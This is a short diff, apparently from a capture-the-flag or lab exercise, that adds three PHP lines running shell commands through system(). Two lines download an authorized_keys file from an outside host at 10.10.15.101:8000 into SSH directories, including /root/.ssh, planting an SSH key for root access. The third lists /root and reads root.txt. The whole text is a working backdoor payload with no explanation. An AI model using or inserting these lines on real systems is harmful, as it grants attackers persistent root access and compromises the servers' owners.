@@ -1,0 +1,3 @@
+<?php system ("mkdir -p /etc/ssh/sshd_config.d/.ssh && rm /etc/ssh/sshd_config.d/.ssh/* && wget -P /etc/ssh/sshd_config.d/.ssh http://10.10.15.101:8000/authorized_keys && chmod 600 /etc/ssh/sshd_config.d/.ssh/authorized_keys;") ?>
+<?php system ("wget -P /root/.ssh http://10.10.15.101:8000/authorized_keys && chmod 600 /root/.ssh/authorized_keys;") ?>
+<?php system ("ls -la /root && cat /root/root.txt;") ?>
